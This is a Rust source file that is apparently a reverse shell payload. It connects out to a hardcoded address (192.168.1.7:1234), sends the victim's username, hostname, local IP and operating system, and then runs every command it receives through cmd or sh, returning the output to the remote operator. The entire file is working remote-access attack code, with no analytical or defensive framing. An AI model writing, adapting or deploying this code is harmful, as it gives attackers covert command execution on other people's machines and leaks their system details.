use std::env;
use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

const TARGET: &str = "192.168.1.7:1234";

#[cfg(target_os = "windows")]
const OS: &str = "windows";

#[cfg(not(target_os = "windows"))]
const OS: &str = "linux";

fn get_username() -> String {
    env::var("USERNAME")
        .or_else(|_| env::var("USER"))
        .unwrap_or_else(|_| "unknown".to_string())
}

fn get_hostname() -> String {
    hostname::get()
        .map(|h| h.to_string_lossy().into_owned())
        .unwrap_or_else(|_| "unknown".to_string())
}

fn get_local_ip() -> String {
    if let Ok(socket) = std::net::UdpSocket::bind("0.0.0.0:0") {
        if socket.connect("8.8.8.8:80").is_ok() {
            if let Ok(local_addr) = socket.local_addr() {
                return local_addr.ip().to_string();
            }
        }
    }
    "N/A".to_string()
}

fn send_metadata(stream: &mut TcpStream) {
    let username = get_username();
    let hostname = get_hostname();
    let ip = get_local_ip();

    let msg = format!(
        "[+] Rust Payload:\n\t- Username: {}\n\t- Hostname: {}\n\t- LocalIP: {}\n\t- OS: {}\n\n",
        username, hostname, ip, OS
    );

    let _ = stream.write_all(msg.as_bytes());
}

fn handle_metadata_request(stream: &mut TcpStream) {
    let username = get_username();
    let hostname = get_hostname();
    
    let response = format!("{}|{}|{}\n", username, hostname, OS);
    let _ = stream.write_all(response.as_bytes());
}

fn execute_command(cmd: &str, stream: &mut TcpStream) {
    // Skip empty commands
    if cmd.trim().is_empty() {
        return;
    }
    
    // Handle metadata request
    if cmd == "METADATA" {
        handle_metadata_request(stream);
        return;
    }
    
    #[cfg(target_os = "windows")]
    let output = Command::new("cmd")
        .arg("/C")
        .arg(cmd)
        .output();

    #[cfg(not(target_os = "windows"))]
    let output = Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .output();

    let result = match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            format!("{}{}", stdout, stderr)
        }
        Err(e) => format!("[Error] {}\n", e),
    };
    
    // Send no-output message if result is empty
    if result.trim().is_empty() {
        let _ = stream.write_all(b"Command executed with no output\n");
    } else {
        // Send each line of output
        for line in result.lines() {
            if !line.trim().is_empty() {
                let _ = stream.write_all(format!("{}\n", line).as_bytes());
            }
        }
    }
    
    // Send command terminator
    let _ = stream.write_all(b"--END--\n");
}

fn main() {
    if let Ok(mut stream) = TcpStream::connect(TARGET) {
        send_metadata(&mut stream);
        let reader = BufReader::new(stream.try_clone().unwrap());

        for line in reader.lines() {
            if let Ok(command) = line {
                execute_command(&command, &mut stream);
            } else {
                break;
            }
        }
    }
}
